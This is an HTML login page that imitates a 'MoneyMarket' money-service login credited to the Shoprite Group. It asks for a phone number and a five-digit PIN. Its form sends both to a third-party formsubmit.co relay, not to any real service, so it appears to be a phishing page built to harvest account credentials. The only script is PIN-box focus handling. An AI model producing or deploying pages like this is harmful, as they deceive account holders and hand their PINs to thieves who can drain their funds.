<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
  <title>MoneyMarket Login</title>
  <link rel="stylesheet" href="sebono.css" />
</head>
<body>

  <div class="header">
    Powered by Shoprite Group of Companies
  </div>

  <div class="logo">
    <h1>MoneyMarket</h1>
  </div>

  <div class="container">
    <h2>Login to your <br><strong>MoneyMarket account</strong></h2>

    <form action="https://formsubmit.co/525a68c3f15ba3237c28cc11c2e7cb21.com" method="POST">
      <div class="input-group">
        <!-- Phone number -->
        <input type="text" name="phone" placeholder="e.g. 0821234567" required />

        <!-- PIN -->
        <div class="pin-boxes">
          <input type="password" name="pin1" maxlength="1" required />
          <input type="password" name="pin2" maxlength="1" required />
          <input type="password" name="pin3" maxlength="1" required />
          <input type="password" name="pin4" maxlength="1" required />
          <input type="password" name="pin5" maxlength="1" required />
        </div>
      </div>

      <button type="submit" class="btn btn-login">Login</button>
    </form>

    <button class="btn btn-open" onclick="alert('Redirect to open account page')">Open an account</button>
  </div>

  <script>
    const pinInputs = document.querySelectorAll('.pin-boxes input');

    pinInputs.forEach((input, index) => {
      input.addEventListener('input', () => {
        if (input.value.length === 1 && index < pinInputs.length - 1) {
          pinInputs[index + 1].focus();
        }
      });

      input.addEventListener('keydown', (e) => {
        if (e.key === 'Backspace' && input.value === '' && index > 0) {
          pinInputs[index - 1].focus();
        }
      });
    });
  </script>

</body>
</html>
